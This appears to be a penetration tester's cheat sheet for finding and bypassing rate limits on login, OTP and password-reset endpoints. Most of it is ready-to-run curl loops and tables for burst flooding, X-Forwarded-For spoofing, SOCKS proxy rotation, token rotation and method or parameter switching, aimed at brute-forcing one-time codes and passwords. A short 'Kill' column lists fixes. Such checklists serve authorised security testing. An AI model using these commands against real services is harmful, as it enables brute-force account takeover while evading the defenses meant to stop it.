# RATE LIMITING — EXECUTION

| Attack | Signal | Test | Confirm | Kill |
|--------|--------|------|---------|------|
| **No Burst Limit** | Sensitive endpoint | `for i in {1..100}; do curl -X POST /api/otp -d "phone=X"; done; wait` | All 200, no 429 | 429 after N |
| **IP Bypass** | Rate limit by IP | `for p in $(cat proxies.txt); do curl --proxy socks5://$p /api/brute; done` | All succeed from diff IPs | DB rate limit (by user) |
| **Header Bypass** | X-Forwarded-For | `curl -H "X-Forwarded-For: 1.1.1.1" /api/otp` ×N with diff IPs | Each request counted separately | Header normalized |
| **Auth Token Rotation** | Rate by token | `for t in $(cat tokens.txt); do curl -H "Bearer: $t" /api/brute; done` | Rotating tokens bypasses limit | Rate by user, not token |
| **Method Bypass** | Rate by endpoint | POST is limited → try PUT/PATCH/GET | Different method, no limit | Rate on user+action |
| **Param Bypass** | Rate by param | `curl /api/login?user=1`, `?user=2`, `?user=3` | Diff params bypass cooldown | Rate by session |

## CURL
```bash
# Test baseline: does rate limit exist?
START=$(date +%s)
for i in {1..50}; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST /api/otp \
    -d '{"phone":"+1234567890"}' -H "Cookie: A")
  echo "$i: $code"
done
END=$(date +%s)
echo "50 requests in $((END - START))s"

# X-Forwarded-For bypass
for i in {1..50}; do
  ip="10.0.0.$i"
  curl -s -X POST /api/otp -H "X-Forwarded-For: $ip" -d '{"phone":"+1"}' &
done; wait

# Proxy rotation bypass
while read proxy; do
  curl -s --proxy "socks5://$proxy" -X POST /api/brute -d '{"otp":"0000"}' &
done < proxies.txt; wait

# Multi-token attack
for token in token_01 token_02 token_03; do
  (curl -s -X POST /api/login -H "Authorization: Bearer $token" \
    -d '{"password":"test"}' &)
done; wait
```

## DECISION TREE
```
Sensitive endpoint (login/OTP/reset)?
├─ Burst 100 requests same IP
│  ├─ All 200 → NO RATE LIMIT (vulnerable)
│  └─ 429 after N → LIMIT EXISTS, try bypass
├─ Can bypass via X-Forwarded-For?
│  ├─ Yes → LIMIT BY IP ONLY (weak)
│  └─ No → User/session-based limit
├─ Can bypass via proxy rotation?
│  ├─ All succeed → PER-IP LIMIT (bypassable)
│  └─ Still blocked → USER-LEVEL LIMIT
└─ Can bypass via method/token change?
   ├─ Different code → PER-METHOD LIMIT (bypassable)
   └─ Same code → ACTION-LEVEL LIMIT (strong)
```
